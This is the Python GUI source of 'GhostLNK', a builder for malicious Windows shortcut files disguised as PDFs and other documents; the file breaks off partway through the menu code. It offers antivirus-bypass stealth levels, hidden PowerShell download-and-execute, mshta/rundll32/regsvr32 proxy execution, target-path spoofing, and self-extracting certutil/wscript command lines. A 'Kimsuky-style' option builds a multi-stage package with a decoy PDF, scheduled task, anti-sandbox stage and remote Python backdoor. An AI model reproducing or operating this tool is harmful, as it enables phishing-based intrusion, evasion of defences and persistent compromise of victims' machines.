import os
import base64
import uuid
import random
from datetime import datetime
from pathlib import Path

from PyQt6.QtWidgets import (QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
                             QLineEdit, QPushButton, QTextEdit, QComboBox, QGroupBox,
                             QGridLayout, QMessageBox, QFileDialog, QCheckBox,
                             QListWidget, QSplitter, QFrame, QScrollArea, QApplication)
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QAction, QClipboard

import pylnk3

from core.engine import LNKEngine
from core.converter import PowerShellConverter, URLExamples
from gui.styles import STYLESHEET
from utils.helpers import (load_config, save_config, xor_encode, obfuscate_strings,
                           build_antisanbox_stub, generate_random_folder_name,
                           generate_task_name)

CONFIG_FILE = "ghostlnk_config.json"


class GhostLNKGUI(QMainWindow):
    ICON_DATABASE = {
        "PDF Document": (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", 11, ".pdf"),
        "Word Document": (r"C:\Windows\System32\SHELL32.dll", 1, ".doc"),
        "Excel Spreadsheet": (r"C:\Windows\System32\SHELL32.dll", 3, ".xls"),
        "Text Document": (r"C:\Windows\System32\notepad.exe", 0, ".txt"),
        "PowerShell Script": (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", 0, ".ps1"),
        "Executable": (r"C:\Windows\System32\SHELL32.dll", 3, ".exe"),
        "JPG Image": (r"C:\Windows\System32\imageres.dll", 67, ".jpg"),
        "ZIP Archive": (r"C:\Windows\System32\imageres.dll", 165, ".zip"),
    }

    def __init__(self):
        super().__init__()
        config = load_config()
        self.recent_urls = config.get('recent_urls', [])
        self.recent_conversions = config.get('recent_conversions', [])
        self.appended_payload_bytes = None
        self.xor_key_bytes = b'\x00'
        self.init_ui()

    def save_config(self):
        config = {'recent_urls': self.recent_urls[-20:], 'recent_conversions': self.recent_conversions[-20:]}
        save_config(config)

    def init_ui(self):
        self.setWindowTitle("GhostLNK :: Advanced Evasion :: github.com/Excalibra")
        screen = QApplication.primaryScreen().availableGeometry()
        window_width = int(screen.width() * 0.70)
        window_height = int(screen.height() * 0.90)
        self.setGeometry(50, 50, window_width, window_height)
        self.setMinimumSize(1000, 800)
        self.setStyleSheet(STYLESHEET)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(5)
        main_layout.setContentsMargins(8, 8, 8, 8)

        header_widget = QWidget()
        header_layout = QHBoxLayout(header_widget)
        header_layout.setContentsMargins(0, 0, 0, 0)
        header_layout.setSpacing(10)

        left_header = QWidget()
        left_layout = QVBoxLayout(left_header)
        left_layout.setSpacing(2)
        left_layout.setContentsMargins(0, 0, 0, 0)

        title = QLabel("GhostLNK")
        title.setAlignment(Qt.AlignmentFlag.AlignLeft)
        title.setStyleSheet("color: #FF00FF; font-size: 24px; font-weight: bold; font-family: 'Courier New', monospace;")
        left_layout.addWidget(title)

        credit = QLabel("Created by: github.com/Excalibra")
        credit.setAlignment(Qt.AlignmentFlag.AlignLeft)
        credit.setStyleSheet("color: #FFFF00; font-size: 12px; font-weight: bold; font-family: 'Courier New', monospace;")
        left_layout.addWidget(credit)

        subtitle = QLabel("Dropbox: &dl=1 | STEALTH | HIDE | RAW TARGET | EVASION | EMBED | APPEND | ICON SMUGGLING | SELF-EXTRACT | KIMSUKY CAMPAIGN")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignLeft)
        subtitle.setStyleSheet("color: #00FFFF; font-size: 10px; font-family: 'Courier New', monospace;")
        left_layout.addWidget(subtitle)

        header_layout.addWidget(left_header, 1)

        console_group = QGroupBox("Console Output")
        console_group.setMaximumHeight(120)
        console_layout = QVBoxLayout()
        console_layout.setSpacing(2)
        console_toolbar = QHBoxLayout()
        clear_btn = QPushButton("Clear")
        clear_btn.setMaximumWidth(60)
        clear_btn.clicked.connect(lambda: self.console.clear())
        console_toolbar.addWidget(clear_btn)
        console_toolbar.addStretch()
        console_layout.addLayout(console_toolbar)
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setStyleSheet("background-color: #000000; color: #00FF00; font-family: 'Courier New', monospace; font-size: 9px; border: 1px solid #FF00FF;")
        console_layout.addWidget(self.console)
        console_group.setLayout(console_layout)
        header_layout.addWidget(console_group, 2)

        main_layout.addWidget(header_widget)

        splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(splitter, 1)

        left_scroll = QScrollArea()
        left_scroll.setWidgetResizable(True)
        left_scroll.setWidget(self.create_converter_panel())
        splitter.addWidget(left_scroll)

        right_scroll = QScrollArea()
        right_scroll.setWidgetResizable(True)
        right_scroll.setWidget(self.create_lnk_panel())
        splitter.addWidget(right_scroll)

        splitter.setSizes([int(window_width * 0.45), int(window_width * 0.45)])

        self.statusBar().showMessage("GhostLNK :: github.com/Excalibra")
        self.statusBar().setStyleSheet("color: #00FFFF; font-family: 'Courier New', monospace;")

        self.create_menu()
        self.log("GhostLNK initialized")
        self.log("[OK] Kimsuky‑Style Multi‑Stage Campaign ready")

    def create_converter_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(6)

        url_group = QGroupBox("Step 1: Enter URL")
        url_layout = QVBoxLayout()
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://www.dropbox.com/scl/fi/.../file.pdf?dl=1")
        self.url_input.textChanged.connect(self.on_url_changed)
        url_layout.addWidget(self.url_input)
        self.dropbox_indicator = QLabel("")
        self.dropbox_indicator.setStyleSheet("color: #FFFF00; font-size: 9px;")
        url_layout.addWidget(self.dropbox_indicator)
        url_group.setLayout(url_layout)
        layout.addWidget(url_group)

        examples_group = QGroupBox("Quick Examples")
        examples_layout = QGridLayout()
        btn1 = QPushButton("PDF Example")
        btn1.clicked.connect(lambda: self.load_url(URLExamples.DROPBOX_EXAMPLE))
        examples_layout.addWidget(btn1, 0, 0)
        btn2 = QPushButton("PowerShell Example")
        btn2.clicked.connect(lambda: self.load_url(URLExamples.DROPBOX_PS1_EXAMPLE))
        examples_layout.addWidget(btn2, 0, 1)
        btn3 = QPushButton("VPS File")
        btn3.clicked.connect(lambda: self.load_url("http://YOUR-VPS:8000/file.pdf"))
        examples_layout.addWidget(btn3, 1, 0)
        btn4 = QPushButton("VPS Script")
        btn4.clicked.connect(lambda: self.load_url("http://YOUR-VPS:8000/script.ps1"))
        examples_layout.addWidget(btn4, 1, 1)
        examples_group.setLayout(examples_layout)
        layout.addWidget(examples_group)

        type_group = QGroupBox("Step 2: Select Payload Type")
        type_layout = QVBoxLayout()
        self.type_combo = QComboBox()
        self.type_combo.addItems([
            "Download & Open (For PDFs, images, documents)",
            "Memory Execute (For PowerShell scripts only)",
            "Ultra Stealth (Minimal output)"
        ])
        self.type_combo.currentIndexChanged.connect(self.on_type_changed)
        type_layout.addWidget(self.type_combo)
        self.type_hint = QLabel("Selected: For PDFs and documents - saves to temp and opens")
        self.type_hint.setWordWrap(True)
        self.type_hint.setStyleSheet("color: #888888; font-size: 9px; padding: 2px;")
        type_layout.addWidget(self.type_hint)
        type_group.setLayout(type_layout)
        layout.addWidget(type_group)

        stealth_group = QGroupBox("Step 3: Stealth Level")
        stealth_layout = QVBoxLayout()
        self.stealth_combo = QComboBox()
        self.stealth_combo.addItems([
            "0 - Normal (Visible output)",
            "1 - Moderate Stealth (Basic obfuscation)",
            "2 - Maximum Stealth (AV Bypass)"
        ])
        self.stealth_combo.currentIndexChanged.connect(self.on_stealth_changed)
        stealth_layout.addWidget(self.stealth_combo)
        self.stealth_hint = QLabel("Maximum Stealth: Uses aliases, avoids -WindowStyle Hidden, minimal code")
        self.stealth_hint.setWordWrap(True)
        self.stealth_hint.setStyleSheet("color: #00FF00; font-size: 9px; padding: 2px;")
        stealth_layout.addWidget(self.stealth_hint)
        stealth_group.setLayout(stealth_layout)
        layout.addWidget(stealth_group)

        options_group = QGroupBox("Step 4: Execution Options")
        options_layout = QVBoxLayout()
        self.pause_cb = QCheckBox("Pause after execution (Window stays open)")
        self.pause_cb.setChecked(False)
        self.pause_cb.toggled.connect(self.update_options)
        options_layout.addWidget(self.pause_cb)
        self.debug_cb = QCheckBox("Enable Debug Mode (Verbose output)")
        self.debug_cb.setChecked(False)
        self.debug_cb.toggled.connect(self.update_options)
        options_layout.addWidget(self.debug_cb)
        self.hide_pwsh_cb = QCheckBox("Hide PowerShell Window (-WindowStyle Hidden)")
        self.hide_pwsh_cb.setChecked(False)
        self.hide_pwsh_cb.toggled.connect(self.update_options)
        options_layout.addWidget(self.hide_pwsh_cb)
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)

        gen_group = QGroupBox("Step 5: Generate (Click in Order)")
        gen_group.setStyleSheet("QGroupBox { font-weight: bold; color: #FF00FF; }")
        gen_layout = QVBoxLayout()
        order_label = QLabel("CLICK IN ORDER: 1 -> 2 -> 3 -> 4")
        order_label.setStyleSheet("color: #FF0000; font-weight: bold; font-size: 10px; padding: 2px;")
        order_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        gen_layout.addWidget(order_label)
        btn_row1 = QHBoxLayout()
        self.show_btn = QPushButton("1. Show Command")
        self.show_btn.setStyleSheet("background-color: #000000; color: #00FFFF; border: 1px solid #FF00FF;")
        self.show_btn.clicked.connect(self.show_command)
        btn_row1.addWidget(self.show_btn)
        self.encode_btn = QPushButton("2. Encode to Base64")
        self.encode_btn.setStyleSheet("background-color: #000000; color: #FFFF00; border: 1px solid #00FFFF;")
        self.encode_btn.clicked.connect(self.encode)
        btn_row1.addWidget(self.encode_btn)
        gen_layout.addLayout(btn_row1)
        btn_row2 = QHBoxLayout()
        self.copy_btn = QPushButton("3. Copy -E Argument")
        self.copy_btn.setStyleSheet("background-color: #000000; color: #00FF00; border: 1px solid #FFFF00;")
        self.copy_btn.clicked.connect(self.copy_arg)
        btn_row2.addWidget(self.copy_btn)
        self.use_btn = QPushButton("4. Use in LNK Generator")
        self.use_btn.setStyleSheet("background-color: #000000; color: #FF00FF; border: 1px solid #00FF00;")
        self.use_btn.clicked.connect(self.use_in_lnk)
        btn_row2.addWidget(self.use_btn)
        gen_layout.addLayout(btn_row2)
        progress_frame = QFrame()
        progress_frame.setFrameStyle(QFrame.Shape.Box)
        progress_frame.setStyleSheet("background-color: #000000; border: 1px solid #00FFFF; padding: 5px;")
        progress_layout = QHBoxLayout(progress_frame)
        progress_layout.addWidget(QLabel("Progress:"))
        self.step1_indicator = QLabel("[ ] Step 1")
        self.step1_indicator.setStyleSheet("color: #666666;")
        progress_layout.addWidget(self.step1_indicator)
        progress_layout.addWidget(QLabel("->"))
        self.step2_indicator = QLabel("[ ] Step 2")
        self.step2_indicator.setStyleSheet("color: #666666;")
        progress_layout.addWidget(self.step2_indicator)
        progress_layout.addWidget(QLabel("->"))
        self.step3_indicator = QLabel("[ ] Step 3")
        self.step3_indicator.setStyleSheet("color: #666666;")
        progress_layout.addWidget(self.step3_indicator)
        progress_layout.addWidget(QLabel("->"))
        self.step4_indicator = QLabel("[ ] Step 4")
        self.step4_indicator.setStyleSheet("color: #666666;")
        progress_layout.addWidget(self.step4_indicator)
        progress_layout.addStretch()
        gen_layout.addWidget(progress_frame)
        gen_group.setLayout(gen_layout)
        layout.addWidget(gen_group)

        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()
        self.cmd_display = QTextEdit()
        self.cmd_display.setMaximumHeight(50)
        results_layout.addWidget(QLabel("PowerShell Command:"))
        results_layout.addWidget(self.cmd_display)
        self.arg_display = QTextEdit()
        self.arg_display.setMaximumHeight(40)
        self.arg_display.setStyleSheet("color: #FF8888;")
        results_layout.addWidget(QLabel("Final -E Argument (copy this):"))
        results_layout.addWidget(self.arg_display)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)

        recent_group = QGroupBox("Recent")
        recent_layout = QVBoxLayout()
        self.recent_list = QListWidget()
        self.recent_list.setMaximumHeight(60)
        recent_layout.addWidget(self.recent_list)
        recent_group.setLayout(recent_layout)
        layout.addWidget(recent_group)

        layout.addStretch()
        return panel

    def create_lnk_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(6)

        # Raw Target Mode
        raw_group = QGroupBox("Raw Target Mode (Bypass PowerShell)")
        raw_layout = QVBoxLayout()
        self.raw_mode_cb = QCheckBox("Enable Raw Target Mode (use custom EXE / command)")
        self.raw_mode_cb.toggled.connect(self.toggle_raw_mode)
        raw_layout.addWidget(self.raw_mode_cb)
        self.raw_widget = QWidget()
        raw_sub_layout = QVBoxLayout(self.raw_widget)
        raw_sub_layout.setContentsMargins(10, 5, 10, 5)
        target_path_layout = QHBoxLayout()
        target_path_layout.addWidget(QLabel("Target Path:"))
        self.raw_target_path = QLineEdit()
        self.raw_target_path.setPlaceholderText("C:\\Windows\\System32\\mshta.exe")
        target_path_layout.addWidget(self.raw_target_path)
        browse_btn = QPushButton("Browse...")
        browse_btn.clicked.connect(self.browse_raw_target)
        target_path_layout.addWidget(browse_btn)
        raw_sub_layout.addLayout(target_path_layout)
        args_layout = QHBoxLayout()
        args_layout.addWidget(QLabel("Arguments:"))
        self.raw_arguments = QLineEdit()
        self.raw_arguments.setPlaceholderText("/c whoami  or  \"https://example.com/script.hta\"")
        args_layout.addWidget(self.raw_arguments)
        raw_sub_layout.addLayout(args_layout)
        note_label = QLabel(
            "Note: URL should be enclosed in quotes. Example: \"https://example.com/script.hta\""
        )
        note_label.setWordWrap(True)
        note_label.setStyleSheet("color: #AAAAAA; font-size: 9px; margin-left: 5px;")
        raw_sub_layout.addWidget(note_label)
        workdir_layout = QHBoxLayout()
        workdir_layout.addWidget(QLabel("Working Dir (optional):"))
        self.raw_working_dir = QLineEdit()
        self.raw_working_dir.setPlaceholderText("%TEMP% or C:\\path")
        workdir_layout.addWidget(self.raw_working_dir)
        raw_sub_layout.addLayout(workdir_layout)
        self.raw_widget.setVisible(False)
        raw_layout.addWidget(self.raw_widget)
        raw_group.setLayout(raw_layout)
        layout.addWidget(raw_group)

        # PowerShell Import
        self.import_group = QGroupBox("Import -E Argument (PowerShell Mode)")
        import_layout = QHBoxLayout()
        self.import_input = QLineEdit()
        self.import_input.setPlaceholderText("Paste -E argument here...")
        import_layout.addWidget(self.import_input)
        import_btn = QPushButton("Import")
        import_btn.setMaximumWidth(60)
        import_btn.clicked.connect(self.import_arg)
        import_layout.addWidget(import_btn)
        self.import_group.setLayout(import_layout)
        layout.addWidget(self.import_group)

        # Direct Base64
        self.base64_group = QGroupBox("Direct Base64 Input (Raw PowerShell Script)")
        base64_layout = QVBoxLayout()
        self.base64_input = QTextEdit()
        self.base64_input.setPlaceholderText("Paste raw base64 string here (no -E prefix)...")
        self.base64_input.setMaximumHeight(60)
        self.base64_input.setStyleSheet("font-family: monospace;")
        base64_layout.addWidget(self.base64_input)
        btn_layout = QHBoxLayout()
        self.use_base64_btn = QPushButton("Use This Base64 as Payload")
        self.use_base64_btn.clicked.connect(self.use_raw_base64)
        btn_layout.addWidget(self.use_base64_btn)
        self.clear_base64_btn = QPushButton("Clear")
        self.clear_base64_btn.clicked.connect(lambda: self.base64_input.clear())
        btn_layout.addWidget(self.clear_base64_btn)
        base64_layout.addLayout(btn_layout)
        self.base64_group.setLayout(base64_layout)
        layout.addWidget(self.base64_group)

        # Advanced Evasion
        evasion_group = QGroupBox("Advanced Evasion")
        evasion_layout = QVBoxLayout()

        self.proxy_cb = QCheckBox("Use conhost.exe as proxy")
        self.proxy_cb.setToolTip("Launches PowerShell via conhost.exe.")
        evasion_layout.addWidget(self.proxy_cb)

        # mshta.exe proxy
        mshta_layout = QHBoxLayout()
        self.mshta_cb = QCheckBox("Use mshta.exe (Remote HTA)")
        self.mshta_cb.setToolTip("Target: mshta.exe, Arguments: URL to HTA file.")
        mshta_layout.addWidget(self.mshta_cb)
        self.mshta_url = QLineEdit()
        self.mshta_url.setPlaceholderText("http://server/payload.hta")
        self.mshta_url.setEnabled(False)
        self.mshta_cb.toggled.connect(lambda checked: self.mshta_url.setEnabled(checked))
        mshta_layout.addWidget(self.mshta_url)
        evasion_layout.addLayout(mshta_layout)

        # rundll32.exe proxy
        rundll_layout = QHBoxLayout()
        self.rundll_cb = QCheckBox("Use rundll32.exe (JavaScript)")
        self.rundll_cb.setToolTip("Execute JavaScript via rundll32.exe mshtml.")
        rundll_layout.addWidget(self.rundll_cb)
        self.rundll_js = QLineEdit()
        self.rundll_js.setPlaceholderText("new ActiveXObject('WScript.Shell').Run('calc.exe')")
        self.rundll_js.setEnabled(False)
        self.rundll_cb.toggled.connect(lambda checked: self.rundll_js.setEnabled(checked))
        rundll_layout.addWidget(self.rundll_js)
        evasion_layout.addLayout(rundll_layout)

        stomp_layout = QHBoxLayout()
        self.stomp_cb = QCheckBox("LNK Stomping: Spoof Target Path")
        self.stomp_cb.setToolTip("Make the LNK appear to point to a benign file.")
        stomp_layout.addWidget(self.stomp_cb)
        self.stomp_path = QLineEdit()
        self.stomp_path.setPlaceholderText("C:\\Users\\Public\\Documents\\invoice.pdf")
        self.stomp_path.setEnabled(False)
        self.stomp_cb.toggled.connect(lambda checked: self.stomp_path.setEnabled(checked))
        stomp_layout.addWidget(self.stomp_path)
        evasion_layout.addLayout(stomp_layout)

        regsvr_layout = QHBoxLayout()
        self.regsvr_cb = QCheckBox("Use regsvr32.exe Proxy (Fileless)")
        self.regsvr_cb.setToolTip("Execute remote SCT/DLL via regsvr32.exe.")
        regsvr_layout.addWidget(self.regsvr_cb)
        self.regsvr_url = QLineEdit()
        self.regsvr_url.setPlaceholderText("http://192.168.1.100/payload.sct")
        self.regsvr_url.setEnabled(False)
        self.regsvr_cb.toggled.connect(lambda checked: self.regsvr_url.setEnabled(checked))
        regsvr_layout.addWidget(self.regsvr_url)
        evasion_layout.addLayout(regsvr_layout)

        self.multistage_cb = QCheckBox("Multi-Stage Stager (Drop VBS + Schedule Task)")
        self.multistage_cb.setToolTip("LNK -> drops VBS -> opens decoy PDF -> scheduled task.")
        self.multistage_cb.toggled.connect(self.toggle_multistage)
        evasion_layout.addWidget(self.multistage_cb)
        self.multistage_widget = QWidget()
        multistage_layout = QVBoxLayout(self.multistage_widget)
        multistage_layout.setContentsMargins(10, 5, 10, 5)
        multistage_layout.addWidget(QLabel("Decoy PDF URL:"))
        self.decoy_url = QLineEdit()
        self.decoy_url.setPlaceholderText("https://example.com/decoy.pdf")
        multistage_layout.addWidget(self.decoy_url)
        multistage_layout.addWidget(QLabel("Final Payload URL:"))
        self.payload_url = QLineEdit()
        self.payload_url.setPlaceholderText("https://example.com/launcher.ps1")
        multistage_layout.addWidget(self.payload_url)
        self.multistage_widget.setVisible(False)
        evasion_layout.addWidget(self.multistage_widget)

        # Kimsuky‑Style Multi‑Stage Campaign (separate from simple multistage)
        self.kimsuky_cb = QCheckBox("Kimsuky‑Style Multi‑Stage Campaign")
        self.kimsuky_cb.setToolTip(
            "Generate a complete fragmented attack package:\n"
            "LNK → XML (scheduled task) → VBS (decoy PDF) → PS1 (anti‑sandbox) → BAT → Python payload.\n"
            "All files are saved to a folder of your choice."
        )
        self.kimsuky_cb.toggled.connect(self.toggle_kimsuky)
        evasion_layout.addWidget(self.kimsuky_cb)
        self.kimsuky_widget = QWidget()
        kimsuky_layout = QVBoxLayout(self.kimsuky_widget)
        kimsuky_layout.setContentsMargins(10, 5, 10, 5)
        kimsuky_layout.addWidget(QLabel("Decoy PDF URL:"))
        self.kimsuky_decoy = QLineEdit()
        self.kimsuky_decoy.setPlaceholderText("https://example.com/decoy.pdf")
        kimsuky_layout.addWidget(self.kimsuky_decoy)
        kimsuky_layout.addWidget(QLabel("Final Payload URL (Python backdoor):"))
        self.kimsuky_payload = QLineEdit()
        self.kimsuky_payload.setPlaceholderText("https://example.com/backdoor.py")
        kimsuky_layout.addWidget(self.kimsuky_payload)
        self.kimsuky_widget.setVisible(False)
        evasion_layout.addWidget(self.kimsuky_widget)

        evasion_group.setLayout(evasion_layout)
        layout.addWidget(evasion_group)

        # Embedded Payload
        embedded_group = QGroupBox("Embedded Payload (No Network)")
        embedded_layout = QVBoxLayout()

        self.embedded_input = QTextEdit()
        self.embedded_input.setPlaceholderText("Paste raw PowerShell script here...")
        self.embedded_input.setMaximumHeight(80)
        self.embedded_input.setStyleSheet("font-family: monospace;")
        embedded_layout.addWidget(self.embedded_input)

        encoding_layout = QHBoxLayout()
        encoding_layout.addWidget(QLabel("Encoding:"))
        self.encoding_combo = QComboBox()
        self.encoding_combo.addItems(["UTF-16LE (PowerShell Default)", "UTF-8", "ASCII"])
        self.encoding_combo.setToolTip("Choose text encoding for base64.")
        encoding_layout.addWidget(self.encoding_combo)
        embedded_layout.addLayout(encoding_layout)

        xor_layout = QHBoxLayout()
        self.xor_cb = QCheckBox("XOR Encode")
        self.xor_cb.setToolTip("Encrypt script with XOR.")
        xor_layout.addWidget(self.xor_cb)
        xor_layout.addWidget(QLabel("Key:"))
        self.xor_key = QLineEdit()
        self.xor_key.setPlaceholderText("0x5A or 'mykey'")
        self.xor_key.setEnabled(False)
        self.xor_cb.toggled.connect(lambda checked: self.xor_key.setEnabled(checked))
        xor_layout.addWidget(self.xor_key)
        embedded_layout.addLayout(xor_layout)

        self.obfuscate_cb = QCheckBox("Obfuscate Strings (Character Concatenation)")
        self.obfuscate_cb.setToolTip("Break up suspicious strings.")
        embedded_layout.addWidget(self.obfuscate_cb)

        self.append_cb = QCheckBox("Append Payload to LNK (Ultra Evasion)")
        self.append_cb.setToolTip("Payload appended to LNK, extracted via obfuscated PowerShell reflection stub.")
        embedded_layout.addWidget(self.append_cb)

        self.binary_smuggle_cb = QCheckBox("Binary Icon Smuggling (wscript + embedded VBS)")
        self.binary_smuggle_cb.setToolTip(
            "Target: wscript.exe, Arguments: LNK file itself.\n"
            "Payload and VBS extractor are appended to the LNK.\n"
            "No suspicious command line—evades AV/EDR."
        )
        embedded_layout.addWidget(self.binary_smuggle_cb)

        self.true_icon_cb = QCheckBox("True Icon Smuggling (IconEnvironmentDataBlock)")
        self.true_icon_cb.setToolTip(
            "Embed encrypted payload in the LNK's IconEnvironmentDataBlock.\n"
            "Target = notepad.exe, no command line arguments.\n"
            "Payload size limited to ~500 bytes.\n"
            "Extractor script (VBS) saved alongside LNK."
        )
        embedded_layout.addWidget(self.true_icon_cb)

        self.self_extract_b64_cb = QCheckBox("Self-Extracting LNK (Base64)")
        self.self_extract_b64_cb.setToolTip(
            "Target: cmd.exe, Arguments: findstr /b \"GHOSTLNK_B64:\" \"%~f0\" > \"%TEMP%\\e.b64\" & certutil -decode \"%TEMP%\\e.b64\" \"%TEMP%\\e.vbs\" & wscript //B \"%TEMP%\\e.vbs\"\n"
            "Base64 VBS appended after marker; arguments under 260 chars."
        )
        embedded_layout.addWidget(self.self_extract_b64_cb)

        self.self_extract_hex_cb = QCheckBox("Self-Extracting LNK (Hex) - Recommended")
        self.self_extract_hex_cb.setToolTip(
            "Target: cmd.exe, Arguments: findstr /b \"GHOSTLNK_HEX:\" \"%~f0\" > \"%TEMP%\\e.hex\" & certutil -decodehex \"%TEMP%\\e.hex\" \"%TEMP%\\e.vbs\" & wscript //B \"%TEMP%\\e.vbs\"\n"
            "Hex-encoded VBS appended; bypasses Base64 signature detection."
        )
        embedded_layout.addWidget(self.self_extract_hex_cb)

        self.embedded_generate_btn = QPushButton("Generate Embedded Payload")
        self.embedded_generate_btn.setToolTip("Create self-decoding payload.")
        self.embedded_generate_btn.clicked.connect(self.generate_embedded_payload)
        embedded_layout.addWidget(self.embedded_generate_btn)

        embedded_group.setLayout(embedded_layout)
        layout.addWidget(embedded_group)

        # Preview
        preview_group = QGroupBox("Payload Preview")
        preview_layout = QVBoxLayout()
        preview_layout.addWidget(QLabel("Target: (not set)"))
        self.preview_label = QLabel("Arguments: (not set)")
        self.preview_label.setWordWrap(True)
        self.preview_label.setStyleSheet("color: #FFFF00; background-color: #000000; border: 1px solid #00FFFF; padding: 3px;")
        preview_layout.addWidget(self.preview_label)
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)

        # Icon Selection
        icon_group = QGroupBox("Icon Selection")
        icon_layout = QVBoxLayout()
        self.icon_combo = QComboBox()
        self.icon_combo.addItems(list(self.ICON_DATABASE.keys()))
        self.icon_combo.setCurrentText("PDF Document")
        icon_layout.addWidget(self.icon_combo)
        icon_group.setLayout(icon_layout)
        layout.addWidget(icon_group)

        # Filename
        file_group = QGroupBox("Output Filename")
        file_layout = QGridLayout()
        file_layout.addWidget(QLabel("Base name:"), 0, 0)
        self.filename_input = QLineEdit("Report")
        file_layout.addWidget(self.filename_input, 0, 1)
        file_layout.addWidget(QLabel("Extension:"), 1, 0)
        self.ext_combo = QComboBox()
        self.ext_combo.addItems([".pdf", ".doc", ".xls", ".txt", ".ps1"])
        file_layout.addWidget(self.ext_combo, 1, 1)
        self.lnk_cb = QCheckBox("Add .lnk extension")
        self.lnk_cb.setChecked(True)
        file_layout.addWidget(self.lnk_cb, 2, 1)
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)

        # Description
        desc_group = QGroupBox("File Description")
        desc_layout = QVBoxLayout()
        self.desc_input = QTextEdit()
        self.desc_input.setMaximumHeight(50)
        desc_layout.addWidget(self.desc_input)
        gen_desc_btn = QPushButton("Generate Description")
        gen_desc_btn.setMinimumWidth(150)
        gen_desc_btn.clicked.connect(self.generate_desc)
        desc_layout.addWidget(gen_desc_btn)
        desc_group.setLayout(desc_layout)
        layout.addWidget(desc_group)

        self.mode_indicator = QLabel("Current Mode: Download & Open")
        self.mode_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")
        layout.addWidget(self.mode_indicator)
        self.stealth_indicator = QLabel("Stealth: Maximum (AV Bypass)")
        self.stealth_indicator.setStyleSheet("color: #00FF00;")
        layout.addWidget(self.stealth_indicator)
        self.hide_indicator = QLabel("PowerShell Window: Visible")
        self.hide_indicator.setStyleSheet("color: #FFFF00;")
        layout.addWidget(self.hide_indicator)

        generate_btn = QPushButton("GENERATE LNK FILE")
        generate_btn.setMinimumHeight(45)
        generate_btn.setStyleSheet("background-color: #000000; color: #FF00FF; border: 2px solid #FF00FF; font-size: 14px; font-weight: bold;")
        generate_btn.clicked.connect(self.generate_lnk)
        layout.addWidget(generate_btn)

        layout.addStretch()
        return panel

    # ----------------------------------------------------------------------
    # UI Control Methods
    # ----------------------------------------------------------------------
    def toggle_raw_mode(self, enabled):
        self.base64_group.setVisible(not enabled)
        self.raw_widget.setVisible(enabled)
        self.import_group.setVisible(not enabled)
        self.type_combo.setEnabled(not enabled)
        self.stealth_combo.setEnabled(not enabled)
        self.pause_cb.setEnabled(not enabled)
        self.debug_cb.setEnabled(not enabled)
        self.hide_pwsh_cb.setEnabled(not enabled)
        self.proxy_cb.setEnabled(not enabled)
        self.mshta_cb.setEnabled(not enabled)
        self.mshta_url.setEnabled(not enabled and self.mshta_cb.isChecked())
        self.rundll_cb.setEnabled(not enabled)
        self.rundll_js.setEnabled(not enabled and self.rundll_cb.isChecked())
        self.stomp_cb.setEnabled(not enabled)
        self.stomp_path.setEnabled(not enabled and self.stomp_cb.isChecked())
        self.regsvr_cb.setEnabled(not enabled)
        self.regsvr_url.setEnabled(not enabled and self.regsvr_cb.isChecked())
        self.multistage_cb.setEnabled(not enabled)
        self.multistage_widget.setVisible(not enabled and self.multistage_cb.isChecked())
        self.kimsuky_cb.setEnabled(not enabled)
        self.kimsuky_widget.setVisible(not enabled and self.kimsuky_cb.isChecked())
        self.embedded_input.setEnabled(not enabled)
        self.encoding_combo.setEnabled(not enabled)
        self.xor_cb.setEnabled(not enabled)
        self.xor_key.setEnabled(not enabled and self.xor_cb.isChecked())
        self.obfuscate_cb.setEnabled(not enabled)
        self.append_cb.setEnabled(not enabled)
        self.binary_smuggle_cb.setEnabled(not enabled)
        self.true_icon_cb.setEnabled(not enabled)
        self.self_extract_b64_cb.setEnabled(not enabled)
        self.self_extract_hex_cb.setEnabled(not enabled)
        self.embedded_generate_btn.setEnabled(not enabled)
        if enabled:
            self.mode_indicator.setText("Current Mode: RAW TARGET (Custom EXE)")
            self.mode_indicator.setStyleSheet("color: #FFFF00; font-weight: bold;")
            self.stealth_indicator.setText("Stealth: N/A (raw target)")
            self.hide_indicator.setText("PowerShell: N/A")
            self.preview_label.setText("Raw target mode active - fill in target and arguments above")
        else:
            self.mode_indicator.setText("Current Mode: Download & Open")
            self.stealth_indicator.setText(f"Stealth: {['None', 'Moderate', 'Maximum'][self.stealth_combo.currentIndex()]}")
            self.hide_indicator.setText("PowerShell Window: Visible" if not self.hide_pwsh_cb.isChecked() else "PowerShell Window: HIDDEN")
            self.update_options()

    def toggle_multistage(self, enabled):
        self.multistage_widget.setVisible(enabled)

    def toggle_kimsuky(self, enabled):
        self.kimsuky_widget.setVisible(enabled)

    def browse_raw_target(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Target Executable", "C:\\", "Executable Files (*.exe);;All Files (*)")
        if file_path:
            self.raw_target_path.setText(file_path)

    def create_menu(self):
        menubar = self.menuBar()
        menubar.setStyleSheet("color: #00FFFF; background-color: #000000;")
        help_menu = menubar.addMenu("Help")
        about = QAction("About GhostLNK", self)
        about.triggered.connect(self.show_about)
        help_menu.addAction(about)
        mode_help = QAction("Mode Guide", self)
        mode_help.triggered.connect(self.show_mode_guide)
        help_menu.addAction(mode_help)
        stealth_help = QAction("Stealth Mode Guide", self)
        stealth_help.triggered.connect(self.show_stealth_help)
        help_menu.addAction(stealth_help)
        hide_help = QAction("Hidden PowerShell Guide", self)
        hide_help.triggered.connect(self.show_hide_help)
        help_menu.addAction(hide_help)
        raw_help = QAction("Raw Target Guide", self)
        raw_help.triggered.connect(self.show_raw_help)
        help_menu.addAction(raw_help)
        evasion_help = QAction("Advanced Evasion Guide", self)
